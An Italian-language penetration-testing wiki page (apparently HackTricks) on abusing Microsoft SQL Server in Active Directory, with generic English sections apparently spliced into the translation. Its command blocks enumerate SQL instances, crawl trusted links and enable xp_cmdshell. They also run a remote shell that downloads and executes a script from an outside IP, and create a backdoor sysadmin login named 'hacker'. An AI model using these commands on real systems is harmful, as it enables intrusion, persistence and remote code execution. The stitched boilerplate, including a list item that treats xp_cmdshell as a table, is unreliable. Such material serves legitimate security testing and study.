# Abuso di MSSQL AD

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## **Enumerazione / Scoperta di MSSQL**

Il modulo powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) è molto utile in questo caso.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Enumerazione dalla rete senza sessione di dominio

To enumerate information from the network without a domain session, you can use the following techniques:

#### 1. Enumerating SQL Server instances

You can use tools like `sqlcmd` or `osql` to connect to SQL Server instances and gather information about the databases and tables present. This can help you identify potential targets for further exploitation.

#### 2. Enumerating SQL Server logins

By querying the `sys.syslogins` table in the `master` database, you can obtain a list of SQL Server logins. This can provide valuable information for potential credential-based attacks.

#### 3. Enumerating SQL Server databases

Using the `sys.databases` table in the `master` database, you can retrieve a list of SQL Server databases. This can help you identify additional targets for exploitation.

#### 4. Enumerating SQL Server tables

By querying the `sys.tables` table in a specific database, you can obtain a list of tables present in that database. This can assist in identifying sensitive data or potential points of interest.

#### 5. Enumerating SQL Server columns

Using the `sys.columns` table in a specific database, you can retrieve a list of columns present in a table. This can help you identify specific data fields that may be of interest.

#### 6. Enumerating SQL Server stored procedures

By querying the `sys.procedures` table in a specific database, you can obtain a list of stored procedures. This can provide insights into the functionality and potential vulnerabilities of the application.

#### 7. Enumerating SQL Server linked servers

Using the `sys.servers` table in the `master` database, you can retrieve a list of linked servers configured in SQL Server. This can help you identify potential paths for lateral movement.

#### 8. Enumerating SQL Server extended stored procedures

By querying the `sys.extended_procedures` table in the `master` database, you can obtain a list of extended stored procedures. This can reveal additional functionality that may be exploitable.

#### 9. Enumerating SQL Server service accounts

Using the `xp_cmdshell` extended stored procedure, you can execute commands on the underlying operating system. This can help you identify the service accounts used by SQL Server, which may be useful for privilege escalation.

#### 10. Enumerating SQL Server database users and roles

By querying the `sys.database_principals` table in a specific database, you can retrieve a list of database users and roles. This can provide insights into the permissions and access levels of different entities within the database.

Remember to always perform these enumeration techniques responsibly and with proper authorization.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Enumerazione dall'interno del dominio

When conducting a penetration test or performing an attack on an Active Directory (AD) environment, it is important to gather as much information as possible from within the domain. This can help in identifying potential vulnerabilities and weaknesses that can be exploited.

Here are some techniques that can be used to enumerate information from inside the domain:

#### 1. Enumerating MSSQL Servers

MSSQL servers are commonly used in AD environments and can contain valuable information. To enumerate MSSQL servers, you can use tools like `nmap` or `Metasploit` to scan for open ports (usually 1433) and identify potential targets. Once you have identified an MSSQL server, you can use tools like `mssql-cli` or `sqlcmd` to connect to the server and gather information such as database names, table names, and user accounts.

#### 2. Enumerating AD Objects

Active Directory contains various objects such as users, groups, computers, and organizational units. Enumerating these objects can provide valuable information about the AD environment. Tools like `PowerShell` can be used to query AD and gather information about users, groups, and their respective permissions. Additionally, tools like `BloodHound` can be used to visualize and analyze the AD environment, identifying potential attack paths and privilege escalation opportunities.

#### 3. Enumerating Group Policy Objects (GPOs)

Group Policy Objects (GPOs) are used to manage and enforce security settings in an AD environment. Enumerating GPOs can provide insights into the security configuration of the domain. Tools like `PowerShell` can be used to query GPOs and gather information about applied policies, including password policies, account lockout policies, and other security-related settings.

#### 4. Enumerating Service Principal Names (SPNs)

Service Principal Names (SPNs) are used to identify services running on computers in an AD environment. Enumerating SPNs can help identify potential targets for attacks such as Kerberoasting. Tools like `PowerShell` can be used to query SPNs and gather information about services running in the domain.

By enumerating information from inside the domain, you can gain a better understanding of the AD environment and identify potential vulnerabilities that can be exploited during a penetration test or attack.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
To access a MSSQL database, you can use the following methods:

1. **SQL Server Management Studio (SSMS):** This is a graphical tool provided by Microsoft to manage MSSQL databases. You can download it from the official website and connect to the database using the appropriate credentials.

2. **Command Line Tools:** MSSQL provides command line tools such as `sqlcmd` and `osql` that allow you to interact with the database. You can execute queries and perform various operations using these tools.

3. **Programming Languages:** You can use programming languages like Python, Java, or C# to connect to the MSSQL database and perform operations programmatically. There are libraries and frameworks available for each language that provide easy integration with MSSQL.

### Exploiting MSSQL

Once you have access to the MSSQL database, you can exploit it in various ways:

1. **Dumping Data:** You can use SQL queries to extract data from the database. For example, you can use the `SELECT` statement to retrieve specific columns or tables. Additionally, you can use tools like `sqlmap` to automate the process of dumping data from the database.

2. **Privilege Escalation:** If you have limited privileges, you can try to escalate your privileges to gain more control over the database. This can be done by exploiting vulnerabilities or misconfigurations in the database or the underlying operating system.

3. **Remote Code Execution:** In some cases, you may be able to execute arbitrary code on the MSSQL server. This can be achieved by exploiting vulnerabilities in the database or by leveraging features like extended stored procedures or SQL Server Agent jobs.

4. **Brute-Forcing Credentials:** If you have a valid username but don't know the password, you can try to brute-force the password using tools like `hydra` or `medusa`. However, this method is time-consuming and may not always be successful.

### MSSQL Security Best Practices

To protect your MSSQL database from abuse, it is important to follow these security best practices:

1. **Strong Authentication:** Use strong and unique passwords for all user accounts. Consider implementing multi-factor authentication for added security.

2. **Regular Patching:** Keep your MSSQL server up to date with the latest security patches. Vulnerabilities in the database can be exploited by attackers to gain unauthorized access.

3. **Least Privilege:** Grant only the necessary privileges to each user account. Avoid giving excessive permissions that could be abused by attackers.

4. **Secure Network Configuration:** Ensure that your MSSQL server is not exposed directly to the internet. Use firewalls and network segmentation to restrict access to the database.

5. **Monitoring and Logging:** Implement logging and monitoring mechanisms to detect and respond to any suspicious activity. Regularly review logs for any signs of unauthorized access or abuse.

By following these best practices, you can significantly reduce the risk of abuse and unauthorized access to your MSSQL database.
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### RCE MSSQL

Potrebbe essere anche possibile **eseguire comandi** all'interno dell'host MSSQL
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Controlla nella pagina menzionata nella **seguente sezione come farlo manualmente**.

### Trucchi di base per l'hacking di MSSQL

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## Collegamenti attendibili di MSSQL

Se un'istanza di MSSQL è attendibile (collegamento al database) da un'altra istanza di MSSQL. Se l'utente ha privilegi sul database attendibile, sarà in grado di **utilizzare la relazione di fiducia per eseguire query anche nell'altra istanza**. Queste fiducie possono essere concatenate e a un certo punto l'utente potrebbe essere in grado di trovare un database mal configurato in cui può eseguire comandi.

**I collegamenti tra database funzionano anche attraverso le fiducie tra foreste.**

### Abuso di Powershell
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

È possibile verificare facilmente i link affidabili utilizzando Metasploit.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Si noti che metasploit cercherà di sfruttare solo la funzione `openquery()` in MSSQL (quindi, se non è possibile eseguire comandi con `openquery()`, sarà necessario provare il metodo `EXECUTE` **manualmente** per eseguire comandi, vedere di più di seguito.)

### Manuale - Openquery()

Da **Linux** è possibile ottenere una shell della console MSSQL con **sqsh** e **mssqlclient.py.**

Da **Windows** è anche possibile trovare i link ed eseguire comandi manualmente utilizzando un **client MSSQL come** [**HeidiSQL**](https://www.heidisql.com)

_Accedi utilizzando l'autenticazione di Windows:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### Trova link affidabili
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### Esegui query in un link affidabile

Esegui query attraverso il link (esempio: trova altri link nella nuova istanza accessibile):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Controlla dove vengono utilizzati i doppi e singoli apici, è importante usarli in quel modo.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Puoi continuare questa catena di link fidati all'infinito manualmente.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Se non è possibile eseguire azioni come `exec xp_cmdshell` da `openquery()`, prova con il metodo `EXECUTE`.

### Manuale - EXECUTE

Puoi anche abusare dei collegamenti fidati utilizzando `EXECUTE`:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Escalazione dei privilegi locali

L'utente locale **MSSQL** di solito ha un tipo speciale di privilegio chiamato **`SeImpersonatePrivilege`**. Questo permette all'account di "impersonare un client dopo l'autenticazione".

Una strategia che molti autori hanno ideato è quella di forzare un servizio **SYSTEM** ad autenticarsi su un servizio falso o di tipo man-in-the-middle creato dall'attaccante. Questo servizio falso è quindi in grado di impersonare il servizio **SYSTEM** mentre sta cercando di autenticarsi.

[SweetPotato](https://github.com/CCob/SweetPotato) contiene una collezione di queste varie tecniche che possono essere eseguite tramite il comando `execute-assembly` di Beacon.

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al repository [hacktricks](https://github.com/carlospolop/hacktricks) e al repository [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
